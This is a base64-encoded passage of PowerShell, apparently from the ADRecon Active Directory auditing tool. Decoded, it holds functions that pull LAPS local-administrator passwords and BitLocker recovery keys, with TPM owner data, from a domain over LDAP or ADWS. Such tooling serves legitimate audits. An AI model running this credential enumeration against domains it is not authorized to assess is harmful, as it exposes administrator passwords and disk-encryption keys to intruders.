hdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbaW50XSAkUGFnZVNpemUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkVGhyZWFkcyA9IDEwCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEQ29tcHV0ZXJzID0gQCggR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICIoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY5KSIgLVByb3BlcnRpZXMgQ04sRE5TSG9zdE5hbWUsJ21zLU1jcy1BZG1Qd2QnLCdtcy1NY3MtQWRtUHdkRXhwaXJhdGlvblRpbWUnIC1SZXN1bHRQYWdlU2l6ZSAkUGFnZVNpemUgKQogICAgICAgIH0KICAgICAgICBDYXRjaCBbU3lzdGVtLkFyZ3VtZW50RXhjZXB0aW9uXQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiWypdIExBUFMgaXMgbm90IGltcGxlbWVudGVkLiIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkxBUFNDaGVja10gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgTEFQUyBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQoKICAgICAgICBJZiAoJEFEQ29tcHV0ZXJzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIExBUFMgT2JqZWN0czogJChbQURSZWNvbi5BRFdTQ2xhc3NdOjpPYmplY3RDb3VudCgkQURDb21wdXRlcnMpKSIKICAgICAgICAgICAgJExBUFNPYmogPSBbQURSZWNvbi5BRFdTQ2xhc3NdOjpMQVBTUGFyc2VyKCRBRENvbXB1dGVycywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRENvbXB1dGVycwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OSkiCiAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJjbiIsImRuc2hvc3RuYW1lIiwibXMtbWNzLWFkbXB3ZCIsIm1zLW1jcy1hZG1wd2RleHBpcmF0aW9udGltZSIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEQ29tcHV0ZXJzID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJMQVBTQ2hlY2tdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIExBUFMgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAkT2JqU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgIElmICgkQURDb21wdXRlcnMpCiAgICAgICAgewogICAgICAgICAgICAkTEFQU0NoZWNrID0gW0FEUmVjb24uTERBUENsYXNzXTo6TEFQU0NoZWNrKCRBRENvbXB1dGVycykKICAgICAgICAgICAgSWYgKC1Ob3QgJExBUFNDaGVjaykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiWypdIExBUFMgaXMgbm90IGltcGxlbWVudGVkLiIKICAgICAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIExBUFMgT2JqZWN0czogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURDb21wdXRlcnMpKSIKICAgICAgICAgICAgICAgICRMQVBTT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6TEFQU1BhcnNlcigkQURDb21wdXRlcnMsICRUaHJlYWRzKQogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEQ29tcHV0ZXJzCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgSWYgKCRMQVBTT2JqKQogICAgewogICAgICAgIFJldHVybiAkTEFQU09iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURSQml0TG9ja2VyCnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIGFsbCBCaXRMb2NrZXIgUmVjb3ZlcnkgS2V5cyBzdG9yZWQgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGFsbCBCaXRMb2NrZXIgUmVjb3ZlcnkgS2V5cyBzdG9yZWQgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgRG9tYWluQ29udHJvbGxlcgogICAgW3N0cmluZ10KICAgIElQIEFkZHJlc3Mgb2YgdGhlIERvbWFpbiBDb250cm9sbGVyLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCiAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgIENyZWRlbnRpYWxzLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW3N0cmluZ10gJERvbWFpbkNvbnRyb2xsZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEQml0TG9ja2VyUmVjb3ZlcnlLZXlzID0gR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICcob2JqZWN0Q2xhc3M9bXNGVkUtUmVjb3ZlcnlJbmZvcm1hdGlvbiknIC1Qcm9wZXJ0aWVzIGRpc3Rpbmd1aXNoZWROYW1lLG1zRlZFLVJlY292ZXJ5UGFzc3dvcmQsbXNGVkUtUmVjb3ZlcnlHdWlkLG1zRlZFLVZvbHVtZUd1aWQsTmFtZSx3aGVuQ3JlYXRlZAogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJCaXRMb2NrZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIG1zRlZFLVJlY292ZXJ5SW5mb3JtYXRpb24gT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCRBREJpdExvY2tlclJlY292ZXJ5S2V5cykKICAgICAgICB7CiAgICAgICAgICAgICRjbnQgPSAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBREJpdExvY2tlclJlY292ZXJ5S2V5cykpCiAgICAgICAgICAgIElmICgkY250IC1nZSAxKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgQml0TG9ja2VyIFJlY292ZXJ5IEtleXM6ICRjbnQiCiAgICAgICAgICAgICAgICAkQml0TG9ja2VyT2JqID0gQCgpCiAgICAgICAgICAgICAgICAkQURCaXRMb2NrZXJSZWNvdmVyeUtleXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgIyBDcmVhdGUgdGhlIG9iamVjdCBmb3IgZWFjaCBpbnN0YW5jZS4KICAgICAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiRGlzdGluZ3Vpc2hlZCBOYW1lIiAtVmFsdWUgJCgoKCRfLmRpc3Rpbmd1aXNoZWROYW1lIC1zcGxpdCAnfScpWzFdKS5zdWJzdHJpbmcoMSkpCiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJOYW1lIiAtVmFsdWUgJF8uTmFtZQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAid2hlbkNyZWF0ZWQiIC1WYWx1ZSAkXy53aGVuQ3JlYXRlZAogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUmVjb3ZlcnkgS2V5IElEIiAtVmFsdWUgJChbR1VJRF0gJF8uJ21zRlZFLVJlY292ZXJ5R3VpZCcpCiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJSZWNvdmVyeSBLZXkiIC1WYWx1ZSAkXy4nbXNGVkUtUmVjb3ZlcnlQYXNzd29yZCcKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlZvbHVtZSBHVUlEIiAtVmFsdWUgJChbR1VJRF0gJF8uJ21zRlZFLVZvbHVtZUd1aWQnKQogICAgICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFRlbXBDb21wID0gR2V0LUFEQ29tcHV0ZXIgLUlkZW50aXR5ICRPYmouJ0Rpc3Rpbmd1aXNoZWQgTmFtZScgLVByb3BlcnRpZXMgbXNUUE0tT3duZXJJbmZvcm1hdGlvbixtc1RQTS1UcG1JbmZvcm1hdGlvbkZvckNvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkJpdExvY2tlcl0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgJCgkT2JqLidEaXN0aW5ndWlzaGVkIE5hbWUnKSBDb21wdXRlciBPYmplY3QiCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBJZiAoJFRlbXBDb21wKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBtc1RQTS1Pd25lckluZm9ybWF0aW9uIChWaXN0YS83IG9yIFNlcnZlciAyMDA4L1IyKQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIm1zVFBNLU93bmVySW5mb3JtYXRpb24iIC1WYWx1ZSAkVGVtcENvbXAuJ21zVFBNLU93bmVySW5mb3JtYXRpb24nCgogICAgICAgICAgICAgICAgICAgICAgICAjIG1zVFBNLVRwbUluZm9ybWF0aW9uRm9yQ29tcHV0ZXIgKFdpbmRvd3MgOC8xMCBvciBTZXJ2ZXIgMjAxMi9SMikKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJtc1RQTS1UcG1JbmZvcm1hdGlvbkZvckNvbXB1dGVyIiAtVmFsdWUgJFRlbXBDb21wLidtc1RQTS1UcG1JbmZvcm1hdGlvbkZvckNvbXB1dGVyJwogICAgICAgICAgICAgICAgICAgICAgICBJZiAoJG51bGwgLW5lICRUZW1wQ29tcC4nbXNUUE0tVHBtSW5mb3JtYXRpb25Gb3JDb21wdXRlcicpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgR3JhYiB0aGUgVFBNIE93bmVyIEluZm8gZnJvbSB0aGUgbXNUUE0tSW5mb3JtYXRpb25PYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUUE1PYmplY3QgPSBHZXQtQURPYmplY3QgLUlkZW50aXR5ICRUZW1wQ29tcC4nbXNUUE0tVHBtSW5mb3JtYXRpb25Gb3JDb21wdXRlcicgLVByb3BlcnRpZXMgbXNUUE0tT3duZXJJbmZvcm1hdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRQTVJlY292ZXJ5SW5mbyA9ICRUUE1PYmplY3QuJ21zVFBNLU93bmVySW5mb3JtYXRpb24nCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVFBNUmVjb3ZlcnlJbmZvID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBFbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIm1zVFBNLU93bmVySW5mb3JtYXRpb24iIC1WYWx1ZSAkbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIm1zVFBNLVRwbUluZm9ybWF0aW9uRm9yQ29tcHV0ZXIiIC1WYWx1ZSAkbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAkVFBNUmVjb3ZlcnlJbmZvID0gJG51bGwKCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVFBNIE93bmVyIFBhc3N3b3JkIiAtVmFsdWUgJFRQTVJlY292ZXJ5SW5mbwogICAgICAgICAgICAgICAgICAgICRCaXRMb2NrZXJPYmogKz0gJE9iagogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREJpdExvY2tlclJlY292ZXJ5S2V5cwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKG9iamVjdENsYXNzPW1zRlZFLVJlY292ZXJ5SW5mb3JtYXRpb24pIgogICAgICAgICRPYmpTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgiZGlzdGluZ3Vpc2hlZE5hbWUiLCJtc2Z2ZS1yZWNvdmVyeXBhc3N3b3JkIiwibXNmdmUtcmVjb3ZlcnlndWlkIiwibXNmdmUtdm9sdW1lZ3VpZCIsIm1zdHBtLW93bmVyaW5mb3JtYXRpb24iLCJtc3RwbS10cG1pbmZvcm1hdGlvbmZvcmNvbXB1dGVyIiwibmFtZSIsIndoZW5jcmVhdGVkIikpCiAgICAgICAgJE9ialNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEQml0TG9ja2VyUmVjb3ZlcnlLZXlzID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJCaXRMb2NrZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIG1zRlZFLVJlY292ZXJ5SW5mb3JtYXRpb24gT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAkT2JqU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgIElmICgkQURCaXRMb2NrZXJSZWNvdmVyeUtleXMpCiAgICAgICAgewogICAgICAgICAgICAkY250ID0gJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURCaXRMb2NrZXJSZWNvdmVyeUtleXMpKQogICAgICAgICAgICBJZiAoJGNudCAtZ2UgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIEJpdExvY2tlciBSZWNvdmVyeSBLZXlzOiAkY250IgogICAgICAgICAgICAgICAgJEJpdExvY2tlck9iaiA9IEAoKQogICAgICAgICAgICAgICAgJEFEQml0TG9ja2VyUmVjb3ZlcnlLZXlzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICMgQ3JlYXRlIHRoZSBvYmplY3QgZm9yIGVhY2ggaW5zdGFuY2UuCiAgICAgICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkRpc3Rpbmd1aXNoZWQgTmFtZSIgLVZhbHVlICQoKCgkXy5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lIC1zcGxpdCAnfScpWzFdKS5zdWJzdHJpbmcoMSkpCiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJOYW1lIiAtVmFsdWUgKFtzdHJpbmddICgkXy5Qcm9wZXJ0aWVzLm5hbWUpKQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAid2hlbkNyZWF0ZWQiIC1WYWx1ZSAoW0RhdGVUaW1lXSAkKCRfLlByb3BlcnRpZXMud2hlbmNyZWF0ZWQpKQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUmVjb3ZlcnkgS2V5IElEIiAtVmFsdWUgJChbR1VJRF0gJF8uUHJvcGVydGllcy4nbXNmdmUtcmVjb3ZlcnlndWlkJ1swXSkKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlJlY292ZXJ5IEtleSIgLVZhbHVlIChbc3RyaW5nXSAoJF8uUHJvcGVydGllcy4nbXNmdmUtcmVjb3ZlcnlwYXNzd29yZCcpKQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVm9sdW1lIEdVSUQiIC1WYWx1ZSAkKFtHVUlEXSAkXy5Qcm9wZXJ0aWVzLidtc2Z2ZS12b2x1bWVndWlkJ1swXSkKCiAgICAgICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICAgICAgICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICAgICAgICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY5KShkaXN0aW5ndWlzaGVkTmFtZT0kKCRPYmouJ0Rpc3Rpbmd1aXNoZWQgTmFtZScpKSkiCiAgICAgICAgICAgICAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJtc3RwbS1vd25lcmluZm9ybWF0aW9uIiwibXN0cG0tdHBtaW5mb3JtYXRpb25mb3Jjb21wdXRlciIpKQogICAgICAgICAgICAgICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUZW1wQ29tcCA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQml0TG9ja2VyXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyAkKCRPYmouJ0Rpc3Rpbmd1aXNoZWQgTmFtZScpIENvbXB1dGVyIE9iamVjdCIKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRPYmpTZWFyY2hlci5kaXNwb3NlKCkKCiAgICAgICAgICAgICAgICAgICAgSWYgKCRUZW1wQ29tcCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgbXNUUE0tT3duZXJJbmZvcm1hdGlvbiAoVmlzdGEvNyBvciBTZXJ2ZXIgMjAwOC9SMikKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJtc1RQTS1Pd25lckluZm9ybWF0aW9uIiAtVmFsdWUgJChbc3RyaW5nXSAkVGVtcENvbXAuUHJvcGVydGllcy4nbXN0cG0tb3duZXJpbmZvcm1hdGlvbicpCgogICAgICAgICAgICAgICAgICAgICAgICAjIG1zVFBNLVRwbUluZm9ybWF0aW9uRm9yQ29tcHV0ZXIgKFdpbmRvd3MgOC8xMCBvciBTZXJ2ZXIgMjAxMi9SMikKICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJtc1RQTS1UcG1JbmZvcm1hdGlvbkZvckNvbXB1dGVyIiAtVmFsdWUgJChbc3RyaW5nXSAkVGVtcENvbXAuUHJvcGVydGllcy4nbXN0cG0tdHBtaW5mb3JtYXRpb25mb3Jjb21wdXRlcicpCiAgICAgICAgICAgICAgICAgICAgICAgIElmICgkbnVsbCAtbmUgJFRlbXBDb21wLlByb3BlcnRpZXMuJ21zdHBtLXRwbWluZm9ybWF0aW9uZm9yY29tcHV0ZXInKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIEdyYWIgdGhlIFRQTSBPd25lciBJbmZvIGZyb20gdGhlIG1zVFBNLUluZm9ybWF0aW9uT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG9ialNlYXJjaFBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAiTERBUDovLyQoJERvbWFpbkNvbnRyb2xsZXIpLyQoJFRlbXBDb21wLlByb3BlcnRpZXMuJ21zdHBtLXRwbWluZm9ybWF0aW9uZm9yY29tcHV0ZXInKSIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9ialNlYXJjaFBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJtc3RwbS1vd25lcmluZm9ybWF0aW9uIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVFBNT2JqZWN0ID0gJG9ialNlYXJjaGVyUGF0aC5GaW5kQWxsKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLmRpc3Bvc2UoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiAoJFRQTU9iamVjdCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUUE1SZWNvdmVyeUluZm8gPSAkKFtzdHJpbmddICRUUE1PYmplY3QuUHJvcGVydGllcy4nbXN0cG0tb3duZXJpbmZvcm1hdGlvbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICAgICAg